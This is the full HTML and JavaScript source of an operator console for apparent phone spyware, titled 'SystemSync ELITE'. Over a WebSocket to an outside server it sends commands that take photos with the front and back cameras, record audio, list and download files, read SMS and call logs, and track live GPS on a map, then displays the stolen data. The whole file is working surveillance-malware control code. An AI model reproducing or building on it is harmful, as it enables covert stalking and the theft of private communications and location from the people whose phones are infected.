<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>SystemSync ELITE Console</title>

<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    height:100vh;
    display:flex;
    flex-direction:column;
    background:linear-gradient(160deg,#030303,#070707,#020202);
    font-family:Segoe UI,system-ui;
    color:#e6e6e6;
}

/* HEADER */

.header{
    height:70px;
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:0 30px;
    background:rgba(0,0,0,0.85);
    backdrop-filter:blur(10px);
    border-bottom:1px solid #111;
}

.logo{
    font-size:20px;
    font-weight:700;
    letter-spacing:1px;
    color:#00e5ff;
}

.status{
    padding:8px 18px;
    border-radius:20px;
    font-weight:600;
    font-size:13px;
}

.online{
    background:#003d25;
    color:#00ff9c;
    box-shadow:0 0 10px #00ff9c55;
}

.offline{
    background:#3b0000;
    color:#ff6b6b;
}

/* LAYOUT */

.main{
    flex:1;
    display:flex;
}

/* SIDEBAR */

.panel{
    width:300px;
    padding:25px;
    background:rgba(10,10,10,0.85);
    backdrop-filter:blur(12px);
    border-right:1px solid #111;
    overflow-y:auto;
}

.section{
    margin-bottom:30px;
}

.section h3{
    font-size:12px;
    color:#666;
    letter-spacing:2px;
    margin-bottom:10px;
}

/* BUTTONS */

button{
    width:100%;
    padding:12px;
    margin-bottom:10px;
    border-radius:8px;
    border:1px solid #1b1b1b;
    background:#0f0f0f;
    color:#dcdcdc;
    cursor:pointer;
    transition:0.25s;
    font-size:14px;
}

button:hover{
    border-color:#00e5ff;
    color:#00e5ff;
    transform:translateX(4px);
}

/* VIEWER */

.viewer{
    flex:1;
    display:flex;
    align-items:center;
    justify-content:center;
}

/* PHONE FRAME */

.phone{
    width:380px;
    height:760px;
    border-radius:40px;
    background:#000;
    border:12px solid #141414;
    box-shadow:
        0 0 40px #00e5ff22,
        inset 0 0 20px #000;
    display:flex;
    flex-direction:column;
    overflow:hidden;
}

.phone-header{
    padding:18px;
    text-align:center;
    border-bottom:1px solid #111;
    color:#00e5ff;
    font-weight:600;
    letter-spacing:1px;
}

.phone-content{
    flex:1;
    overflow-y:auto;
    padding:15px;
}

/* DATA CARDS */

.data-card{
    background:#0d0d0d;
    padding:12px;
    margin-bottom:12px;
    border-radius:10px;
    border-left:4px solid #00e5ff;
    font-size:13px;
}

/* MAP */

#map{
    height:100%;
    width:100%;
    border-radius:12px;
}

</style>
</head>

<body>

<div class="header">
    <div class="logo">SYSTEMSYNC ELITE</div>
    <div id="connectionStatus" class="status offline">DEVICE OFFLINE</div>
</div>

<div class="main">

    <!-- SIDEBAR -->

    <div class="panel">

        <div class="section">
            <h3>SURVEILLANCE</h3>

            <button onclick="sendCommand('camFront')">üì∏ Front Camera</button>
            <button onclick="sendCommand('camBack')">üì∏ Back Camera</button>
            <button onclick="sendCommand('startAudio')">üé§ Start Audio</button>
            <button onclick="sendCommand('stopAudio')">üõë Stop Audio</button>
        </div>

        <div class="section">
            <h3>FILES & DATA</h3>

            <button onclick="sendCommand('ls root')">üìÇ File Explorer</button>
            <button onclick="sendCommand('getSMS inbox')">üí¨ Inbox SMS</button>
            <button onclick="sendCommand('getCallLogs')">üìû Call Logs</button>
        </div>

        <div class="section">
            <h3>TRACKING</h3>

            <button onclick="sendCommand('getLocation')">üìç Live GPS</button>
        </div>

    </div>

    <!-- VIEWER -->

    <div class="viewer">

        <div class="phone">

            <div class="phone-header" id="outputHeader">
                Console Ready
            </div>

            <div class="phone-content" id="outputContent">
                <div style="text-align:center;color:#333;margin-top:50%;">
                    Awaiting connection...
                </div>
            </div>

        </div>

    </div>

</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<script>

const ws = new WebSocket("wss://mirror-view.onrender.com");
let mapInstance=null;

ws.onopen=()=>ws.send("I_AM_WEB");

ws.onmessage=(event)=>{

    const msg=event.data;

    if(msg.startsWith("STATUS:")){

        const status=msg.split(":")[1];
        const badge=document.getElementById('connectionStatus');

        badge.className = "status " + (status==="ONLINE" ? "online":"offline");
        badge.innerText="DEVICE "+status;
    }

    else if(msg.startsWith("SMS_DATA:"))
        renderList("SMS",JSON.parse(msg.substring(9)));

    else if(msg.startsWith("CALL_DATA:"))
        renderList("Calls",JSON.parse(msg.substring(10)));

    else if(msg.startsWith("FILE_LIST:"))
        renderFiles(JSON.parse(msg.substring(10)));

    else if(msg.startsWith("LOC_DATA:"))
        renderLocation(JSON.parse(msg.substring(9)));

    else if(msg.startsWith("FILE_DATA:"))
        downloadBase64(msg.substring(10));
};

function sendCommand(cmd){

    ws.send(cmd);

    document.getElementById('outputContent').innerHTML=
        "<div style='text-align:center;padding:20px;'>Syncing...</div>";
}

/* LIST */

function renderList(type,data){

    document.getElementById('outputHeader').innerText=type+" Log";

    const container=document.getElementById('outputContent');
    container.innerHTML="";

    data.forEach(item=>{

        const card=document.createElement('div');
        card.className="data-card";

        card.innerHTML=
            Object.keys(item)
                .map(k=>`<div><small style="color:#666">${k.toUpperCase()}:</small> ${item[k]}</div>`)
                .join("");

        container.appendChild(card);
    });
}

/* FILES */

function renderFiles(data){

    document.getElementById('outputHeader').innerText="File Explorer";

    const container=document.getElementById('outputContent');
    container.innerHTML="";

    data.forEach(file=>{

        const card=document.createElement('div');
        card.className="data-card";

        card.innerHTML=`
            <div>${file.isDir?'üìÅ':'üìÑ'} <b>${file.name}</b></div>
            <button style="width:auto;margin-top:6px;"
                onclick="sendCommand('${file.isDir?'ls ':'dl '}${file.path}')">
                ${file.isDir?'Open':'Download'}
            </button>`;

        container.appendChild(card);
    });
}

/* MAP */

function renderLocation(data){

    document.getElementById('outputHeader').innerText="GPS Location";

    const container=document.getElementById('outputContent');
    container.innerHTML="<div id='map'></div>";

    if(data.error){
        container.innerHTML=`<div style="color:red">${data.error}</div>`;
        return;
    }

    setTimeout(()=>{

        if(mapInstance) mapInstance.remove();

        mapInstance=L.map('map').setView([data.lat,data.lon],15);

        L.tileLayer(
            'https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png'
        ).addTo(mapInstance);

        L.marker([data.lat,data.lon]).addTo(mapInstance);

    },200);
}

/* DOWNLOAD */

function downloadBase64(base64){

    const link=document.createElement('a');

    link.href="data:application/octet-stream;base64,"+base64;
    link.download="downloaded_file";
    link.click();
}

</script>

</body>
</html>
